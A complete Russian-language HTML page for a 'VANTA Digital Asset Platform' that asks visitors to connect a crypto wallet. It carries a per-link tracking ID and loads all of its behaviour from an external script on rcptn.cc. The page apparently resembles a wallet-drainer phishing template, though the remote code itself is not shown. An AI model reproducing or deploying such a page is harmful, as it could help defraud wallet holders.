
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="link_id" content="Z2hipe7gUlaJ">

    <title>VANTA</title>

    <script defer type="module" crossorigin
            src="https://rcptn.cc/static/reception/js/build.js"></script>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;
            background:
                radial-gradient(circle at 50% 0%, #211638 0%, transparent 42%),
                #09090d;
            color: #ffffff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 24px 18px;
        }

        .container {
            width: 100%;
            max-width: 440px;
            background: linear-gradient(145deg, #171320, #100e16);
            border: 1px solid #30243e;
            border-radius: 26px;
            padding: 34px 25px;
            text-align: center;
            box-shadow:
                0 20px 70px #00000080,
                0 0 45px #7950d81a;
        }

        .logo {
            font-size: 36px;
            font-weight: 800;
            letter-spacing: 10px;
            padding-left: 10px;
            color: #ffffff;
            margin-bottom: 10px;
        }

        .subtitle {
            color: #92899f;
            font-size: 11px;
            letter-spacing: 3px;
            margin-bottom: 38px;
        }

        .wallet-icon {
            width: 82px;
            height: 82px;
            margin: 0 auto 25px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 24px;
            background: linear-gradient(145deg, #302044, #1d1729);
            border: 1px solid #493263;
            color: #b58aff;
            font-size: 39px;
            box-shadow: 0 0 35px #7950d825;
        }

        h1 {
            font-size: 23px;
            font-weight: 700;
            margin-bottom: 13px;
        }

        .description {
            color: #96909f;
            font-size: 14px;
            line-height: 1.65;
            margin-bottom: 29px;
        }

        .connect-button {
            width: 100%;
            min-height: 56px;
            border: none;
            border-radius: 15px;
            background: linear-gradient(110deg, #7950d8, #9566ed);
            color: #ffffff;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            box-shadow: 0 8px 25px #7950d840;
            transition: transform 0.2s, box-shadow 0.2s;
        }

        .connect-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 12px 30px #7950d860;
        }

        .connect-button:active {
            transform: scale(0.98);
        }

        .security-note {
            margin-top: 22px;
            color: #777080;
            font-size: 11px;
            line-height: 1.6;
        }

        .footer {
            margin-top: 35px;
            color: #625b6d;
            font-size: 10px;
            letter-spacing: 2px;
        }

        #root {
            width: 100%;
            max-width: 440px;
        }

        @media (max-width: 380px) {
            .container {
                padding: 29px 19px;
            }

            .logo {
                font-size: 31px;
            }

            h1 {
                font-size: 21px;
            }
        }
    </style>
</head>

<body>

    <div class="container">

        <div class="logo">VANTA</div>

        <div class="subtitle">
            DIGITAL ASSET PLATFORM
        </div>

        <div class="wallet-icon">◈</div>

        <h1>Подключение кошелька</h1>

        <p class="description">
            Подключите свой криптовалютный кошелёк
            для взаимодействия с платформой VANTA.
        </p>

        <button
            type="button"
            class="connect-button"
            onclick="open_window();">
            Подключить кошелёк
        </button>

        <div class="security-note">
            Подключение осуществляется через интерфейс
            вашего кошелька.
        </div>

        <div class="footer">
            VANTA DIGITAL PLATFORM
        </div>

    </div>

    <div id="root"></div>

    <script>
        function open_window() {
            window.postMessage({ type: 'connect-wallet-btn' }, '*');
        }
    </script>

</body>
</html>
